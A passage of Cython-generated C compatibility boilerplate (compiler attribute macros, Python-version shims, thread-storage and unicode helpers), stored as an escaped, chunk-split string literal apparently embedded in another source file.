defined(__GNUC__)\\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\\n#   else\\n#     define CYTHON_UNUSED\\n#   endif\\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\\n# else\\n#   define CYTHON_UNUSED\\n# endif\\n#endif\\n#ifndef CYTHON_MAYBE_UNUSED_VAR\\n#  if defined(__cplusplus)\\n     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }\\n#  else\\n#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)\\n#  endif\\n#endif\\n#ifndef CYTHON_NCP_UNUSED\\n# if CYTHON_COMPILING_IN_CPYTHON\\n#  define CYTHON_NCP_UNUSED\\n# else\\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\\n# endif\\n#endif\\n#define __Pyx_void\"\"_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\\n#ifdef _MSC_VER\\n    #ifndef _MSC_STDINT_H_\\n        #if _MSC_VER < 1300\\n           typedef unsigned char     uint8_t;\\n           typedef unsigned int      uint32_t;\\n        #else\\n           typedef unsigned __int8   uint8_t;\\n           typedef unsigned __int32  uint32_t;\\n        #endif\\n    #endif\\n#else\\n   #include <stdint.h>\\n#endif\\n#ifndef CYTHON_FALLTHROUGH\\n  #if defined(__cplusplus) && __cplusplus >= 201103L\\n    #if __has_cpp_attribute(fallthrough)\\n      #define CYTHON_FALLTHROUGH [[fallthrough]]\\n    #elif __has_cpp_attribute(clang::fallthrough)\\n      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\\n    #elif __has_cp""p_attribute(gnu::fallthrough)\\n      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\\n    #endif\\n  #endif\\n  #ifndef CYTHON_FALLTHROUGH\\n    #if __has_attribute(fallthrough)\\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\\n    #else\\n      #define CYTHON_FALLTHROUGH\\n    #endif\\n  #endif\\n  #if defined(__clang__ ) && defined(__apple_build_version__)\\n    #if __apple_build_version__ < 7000000\\n      #undef  CYTHON_FALLTHROUGH\\n      #define CYTHON_FALLTHROUGH\\n    #endif\\n  #endif\\n#endif\\n\\n#ifndef CYTHON_INLINE\\n  #if defined(__clang__)\\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\\n  #elif defined(__GNUC__)\\n    #define CYTHON_INLINE __inline__\\n  #elif defined(_MSC_VER)\\n    #define CYTHON_INLINE __inline\\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\n    #define CYTHON_INLINE inline\\n  #else\\n    #define CYTHON_INLINE\\n  #endif\\n#endif\\n\\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)\\n  #define Py_OptimizeFlag 0\\n#endif\\n#define __PYX_BUILD_PY_SSIZE_T \\\"n\\\"\\n#define CYTHON_FORMAT_SSIZE_T \\\"z\\\"\\n#if PY_MAJOR_VERSION < 3\\n  #define __Pyx_BUILTIN_MODULE_NAME \\\"__builtin__\\\"\\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, ln\"\"os)\\\\\\n          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\n  #define __Pyx_DefaultClassType PyClass_Type\\n#else\\n  #define __Pyx_BUILTIN_MODULE_NAME \\\"builtins\\\"\\n  #define __Pyx_DefaultClassType PyType_Type\\n#if PY_VERSION_HEX >= 0x030B00A1\\n    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,\\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\\n                                                    PyObject *name, int flin""e, PyObject *lnos) {\\n        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;\\n        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;\\n        const char *fn_cstr=NULL;\\n        const char *name_cstr=NULL;\\n        PyCodeObject* co=NULL;\\n        PyObject *type, *value, *traceback;\\n        PyErr_Fetch(&type, &value, &traceback);\\n        if (!(kwds=PyDict_New())) goto end;\\n        if (!(argcount=PyLong_FromLong(a))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_argcount\\\", argcount) != 0) goto end;\\n        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_posonlyargcount\\\", posonlyargcount) != 0) goto end;\\n        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_kwonlyargcount\\\", kwonlyargcount) != 0) goto end;\\n        if (!(nlocals=PyLong_FromLong(l))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_nlocals\\\", nlocals) != 0) goto end;\\n        if (!(stacksize=PyLong_FromLong(s))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_stacksize\\\", stacksize) != 0) goto end;\\n        if (!(flags=PyLong_FromLong(f))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_flags\\\", flags) != 0) goto end;\\n        if (PyDict_SetItemSt\"\"ring(kwds, \\\"co_code\\\", code) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_consts\\\", c) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_names\\\", n) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_varnames\\\", v) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_freevars\\\", fv) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_cellvars\\\", cell) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_linetable\\\", lnos) != 0) goto end;\\n        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) ""goto end;\\n        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;\\n        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;\\n        if (!(replace = PyObject_GetAttrString((PyObject*)co, \\\"replace\\\"))) goto cleanup_code_too;\\n        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here\\n        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;\\n        Py_XDECREF((PyObject*)co);\\n        co = (PyCodeObject*)call_result;\\n        call_result = NULL;\\n        if (0) {\\n            cleanup_code_too:\\n            Py_XDECREF((PyObject*)co);\\n            co = NULL;\\n        }\\n        end:\\n        Py_XDECREF(kwds);\\n        Py_XDECREF(argcount);\\n        Py_XDECREF(posonlyargcount);\\n        Py_XDECREF(kwonlyargcount);\\n        Py_XDECREF(nlocals);\\n        Py_XDECREF(stacksize);\\n        Py_XDECREF(replace);\\n        Py_XDECREF(call_result);\\n        Py_XDECREF(empty);\\n        if (type) {\\n            PyErr_Restore(type, value, traceback);\\n        }\\n        return co;\\n    }\\n#else\\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\n#endif\\n  #define __Pyx_DefaultClassType PyType_Type\\n#endif\\n#ifndef Py_TPFLAGS_CHECKTYPES\\n  #define Py_TPFLAGS_CHECKTYPES 0\\n#endif\\n#if\"\"ndef Py_TPFLAGS_HAVE_INDEX\\n  #define Py_TPFLAGS_HAVE_INDEX 0\\n#endif\\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\\n#endif\\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\\n#endif\\n#ifndef METH_STACKLESS\\n  #define METH_STACKLESS 0\\n#endif\\n#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)\\n  #ifndef METH_FASTCALL\\n     #define METH_FASTCALL 0x80\\n  #endif\\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const ""*args, Py_ssize_t nargs);\\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\\n                                                          Py_ssize_t nargs, PyObject *kwnames);\\n#else\\n  #define __Pyx_PyCFunctionFast _PyCFunctionFast\\n  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\\n#endif\\n#if CYTHON_FAST_PYCCALL\\n#define __Pyx_PyFastCFunction_Check(func)\\\\\\n    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))\\n#else\\n#define __Pyx_PyFastCFunction_Check(func) 0\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\\n  #define PyObject_Free(p)     PyMem_Free(p)\\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1\\n  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)\\n  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)\\n  #define PyMem_RawFree(p)             PyMem_Free(p)\\n#endif\\n#if CYTHON_COMPILING_IN_PYSTON\\n  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)\\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)\\n#else\\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\\n#endif\\n#if !CYTHON_FAST_THREAD_STATE || PY_VER\"\"SION_HEX < 0x02070000\\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\\n#elif PY_VERSION_HEX >= 0x03060000\\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\\n#elif PY_VERSION_HEX >= 0x03000000\\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\\n#else\\n  #define __Pyx_PyThreadState_Current _PyThreadState_Current\\n#endif\\n#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)""\\n#include \\\"pythread.h\\\"\\n#define Py_tss_NEEDS_INIT 0\\ntypedef int Py_tss_t;\\nstatic CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {\\n  *key = PyThread_create_key();\\n  return 0;\\n}\\nstatic CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {\\n  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));\\n  *key = Py_tss_NEEDS_INIT;\\n  return key;\\n}\\nstatic CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {\\n  PyObject_Free(key);\\n}\\nstatic CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {\\n  return *key != Py_tss_NEEDS_INIT;\\n}\\nstatic CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {\\n  PyThread_delete_key(*key);\\n  *key = Py_tss_NEEDS_INIT;\\n}\\nstatic CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {\\n  return PyThread_set_key_value(*key, value);\\n}\\nstatic CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {\\n  return PyThread_get_key_value(*key);\\n}\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\\n#else\\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\\n#endif\\n#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION\\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\\n#else\\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)\\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_\"\"HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS\\n#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\\n#else\\n#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)\\n#endif\\n#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)\\n  #define CYTHON_PEP393_ENABLED 1\\n  #if PY_VERSION_HEX >= 0x030C0000\\n    #defin""e __Pyx_PyUnicode_READY(op)       (0)\\n  #else\\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\\n  #endif\\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)\\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\\n  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)\\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)\\n  #if PY_VERSION_HEX >= 0x030C0000\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\\n  #else\\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\\n    #else\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\\n    #endif\\n  #endif\\n#else\\n  #define CYTHON_PEP393_ENABLED 0\\n  #define PyUnicode_1BYTE_KIND  1\\n  #define PyUnicode_2BYTE_KIND  2\\n  #define PyUnicode_4BYTE_KIND  4\\n  #define __Pyx_PyUnicode_READY(op)       (0)\\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)\\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))\\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u) \"\"  ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)\\n  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))\\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))\\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))\\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] ="" ch)\\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY\\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\\n#else\\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)\\n  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)\\n  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)\\n  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, \\\"__format__\\\", \\\"O\\\", fmt)\\n#endif\\n#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))\\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\\n#if PY_MAJOR_VERSION >= 3\\n  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)\\n#else\\n  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)\\n#endif\\n#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)\\n  #define PyObject_ASCII(o)            PyObject_Repr(o)\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define PyBaseString_Type            PyUnicod\"\"e_Type\\n  #define PyStringObject               PyUnicodeObject\\n  #define PyString_Type                PyUnicode_Type\\n  #define PyString_Check               PyUnicode_Check\\n  #define PyString_CheckExact          PyUnicode_CheckExact\\n#ifndef PyObject_Unicode\\n  #define PyObject_Unicode             PyObj""ect_Str\\n#endif\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)\\n  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)\\n#else\\n  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))\\n  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))\\n#endif\\n#ifndef PySet_CheckExact\\n  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)\\n#endif\\n#if PY_VERSION_HEX >= 0x030900A4\\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\\n#else\\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\\n#endif\\n#if CYTHON_ASSUME_SAFE_MACROS\\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\\n#else\\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define PyIntObject                  PyLongObject\\n  #define PyInt_Type                   PyLong_Type\\n  #define PyInt_Check(op)              PyLong_Check(op)\\n  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)\\n  #define PyInt_FromString             PyLong_FromString\\n  #define PyInt_FromUnicode            PyLong_FromUnicode\\n  #define PyInt_FromLong               PyLong_FromLong\\n  #define PyInt_FromSize_t             PyLong_FromSize_t\\n  #define PyInt_FromSsize_t            PyLong_FromSsize_t\\n  #define PyInt_AsLong                 PyLong_AsLong\\n  #define PyInt_AS_LONG                PyLong_AS_LONG\\n  #define PyInt_AsSsize_t              PyLong_AsSsize_t\\n  #define PyInt_AsUnsignedLongMa\"\"sk     PyLong_AsUnsignedLongMask\\n  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask\\n  #define PyNumber_Int                 PyNumber_Long\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define PyBoolObject                 PyLongObject\\n#endif\\n#if"" PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY\\n  #ifndef PyUnicode_InternFromString\\n    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\\n  #endif\\n#endif\\n#if PY_VERSION_HEX < 0x030200A4\\n  typedef long Py_hash_t;\\n  #define __Pyx_PyInt_FromHash_t PyInt_FromLong\\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t\\n#else\\n  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t\\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))\\n#else\\n  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)\\n#endif\\n#if CYTHON_USE_ASYNC_SLOTS\\n  #if PY_VERSION_HEX >= 0x030500B1\\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\\n    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)\\n  #else\\n    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))\\n  #endif\\n#else\\n  #define __Pyx_PyType_AsAsync(obj) NULL\\n#endif\\n#ifndef __Pyx_PyAsyncMethodsStruct\\n    typedef struct {\\n        unaryfunc am_await;\\n        unaryfunc am_aiter;\\n        unaryfunc am_anext;\\n    } __Pyx_PyAsyncMethodsStruct;\\n#endif\\n\\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\\n  #if !defined(_USE_MATH_DEFINES)\\n    #define _USE_MATH_DEFINES\\n  #endif\\n#endif\\n#include <math.h>\\n#ifdef NAN\\n#define __PYX_NAN() ((float) NAN)\\n#else\\nstatic CYTHON_INLINE float __PYX_NAN() {\\n  float value;\\n  memset(&value, 0xFF, sizeof(value));\\n  return value;\\n}\\n#endif\\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\\n#define __Pyx_truncl trunc\\n#else\\n#define __Pyx_truncl truncl\\n#endif\\n\\n#define __P\"\"YX_MARK_ERR_POS(f_index, lineno) \\\\\\n    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }""\\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\\\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\\n\\n#ifndef __PYX_EXTERN_C\\n  #ifdef __cplusplus\\n    #define __PYX_EXTERN_C extern \\\"C\\\"\\n  #else\\n    #define __PYX_EXTERN_C extern\\n  #endif\\n#endif\\n\\n#define __PYX_HAVE__source\\n#define __PYX_HAVE_API__source\\n/* Early includes */\\n#ifdef _OPENMP\\n#include <omp.h>\\n#endif /* _OPENMP */\\n\\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\\n#define CYTHON_WITHOUT_ASSERTIONS\\n#endif\\n\\ntypedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;\\n                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;\\n\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)\\n#define __PYX_DEFAULT_STRING_ENCODING \\\"\\\"\\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\\n#define __Pyx_long_cast(x) ((long)x)\\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py\"\"_ssize_t limit) {\\n    return (size_t) i < (size_t) limit;\\n}\\n#if defined (__cplusplus) && __cplusplus >= 20110""3L\\n    #include <cstdlib>\\n    #define __Pyx_sst_abs(value) std::abs(value)\\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\\n    #define __Pyx_sst_abs(value) abs(value)\\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\\n    #define __Pyx_sst_abs(value) labs(value)\\n#elif defined (_MSC_VER)\\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\n    #define __Pyx_sst_abs(value) llabs(value)\\n#elif defined (__GNUC__)\\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\\n#else\\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\\n#endif\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\\n#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))\\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\\n#if PY_MAJOR_VERSION < 3\\n    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString\\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\\n#else\\n    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString\\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize\\n#endif\\n#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsSString(s)    ((const signed\"\" char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsUString(s)    ((co""nst unsigned char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\\n#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)\\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {\\n    const Py_UNICODE *u_end = u;\\n    while (*u_end++) ;\\n    return (size_t)(u_end - u - 1);\\n}\\n#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))\\n#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode\\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\\n#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)\\n#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)\\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);\\n#define 